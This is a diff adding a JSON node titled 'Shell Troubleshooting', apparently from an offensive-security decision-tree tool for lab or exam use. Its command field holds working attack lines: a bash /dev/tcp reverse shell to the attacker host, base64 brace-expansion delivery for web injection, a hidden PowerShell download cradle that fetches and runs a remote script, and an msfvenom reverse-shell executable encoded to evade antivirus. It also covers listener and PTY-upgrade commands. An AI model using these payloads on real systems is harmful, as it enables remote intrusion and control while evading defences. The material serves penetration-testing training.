@@ -1,0 +1,26 @@
+{
+  "id": "shell_troubleshoot",
+  "phase": "SHELL",
+  "title": "Shell Troubleshooting",
+  "body": "Shell not catching or dying immediately. Work through this systematically — the failure mode is almost always one of five things.",
+  "cmd": "# -- BIND SHELL VS REVERSE SHELL ──────────\n# Reverse shell: target connects BACK to you (nc -nlvp PORT on Kali)\n# Bind shell:    target LISTENS, you connect TO it (nc $ip PORT)\n# Some exploits (e.g. CVE-2007-4560 clamav-milter) open bind shells\n# If exploit fires but nothing hits your listener — try nc $ip <port>\n# Lab: ClamAV — exploit opened port 31337 on target, no listener needed\n\n# -- SCRIPT INTERPRETER ISSUES ─────────────\n# No shebang line = bash tries to run it = silent failure\n# perl scripts: always call  perl script.pl  not  ./script.pl\n# python scripts: python3 script.py\n# ruby scripts: ruby script.rb\n# Old boxes may not have python3 — try python for PTY upgrade\n\n# -- DIAGNOSTIC CHECKLIST -----------------\n\n# 1. CAN THE TARGET REACH YOU?\n# On target:\nping $lhost -c 1       # ICMP allowed?\ncurl http://$lhost      # HTTP out allowed?\n# On attacker — watch tcpdump:\nsudo tcpdump -i tun0 icmp\nsudo tcpdump -i tun0 port $lport\n# No ping = strict egress — try ports 80, 443, 53\n\n# 2. WRONG PORT — FIREWALL FILTERING\n# Retry with common allowed egress ports:\nexport lport=443   # HTTPS — almost never blocked\nexport lport=80    # HTTP\nexport lport=53    # DNS (use for tunnel not reverse shell normally)\nnc -nlvp 443\n\n# 3. SHELL BINARY NOT AVAILABLE\n# Test what's on the target:\nwhich bash sh python python3 perl ruby nc ncat\n# Use whatever is present in the payload\n\n# 4. ENCODING ISSUE (web delivery)\n# Spaces and special chars break bash -c in web context\n# Use base64 brace expansion — no spaces, no special chars:\necho 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' | base64 -w0\n# Take the output (B64) and deliver as:\nbash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'\n\n# PowerShell must use UTF-16LE encoding (not UTF-8):\necho 'IEX(New-Object Net.WebClient).DownloadString(\"http://$lhost/shell.ps1\")' | iconv -t UTF-16LE | base64 -w0\npowershell -nop -w hidden -enc B64OUTPUT\n\n# Quick test — does base64 decode correctly?\necho \"B64OUTPUT\" | base64 -d  # verify payload before delivery\n\n# 5. AV/AMSI BLOCKING BINARY\n# Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443   -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe\n\n# 6. INTERACTIVE SHELL NEEDED (su, ssh)\n# Some exploits give non-interactive — upgrade immediately\nscript /dev/null -c bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+  "warn": "tcpdump is your ground truth. Run it on tun0 BEFORE executing payload. If you see the connection hit your interface but nc catches nothing: wrong port on listener. If nothing hits interface at all: egress filtered or wrong LHOST.",
+  "choices": [
+    {
+      "label": "Fixed — shell caught",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "AV issue — bypass",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Port filtered — try bind shell",
+      "next": "shell_bind"
+    },
+    {
+      "label": "Need different approach",
+      "next": "reverse_shell"
+    }
+  ]
+}
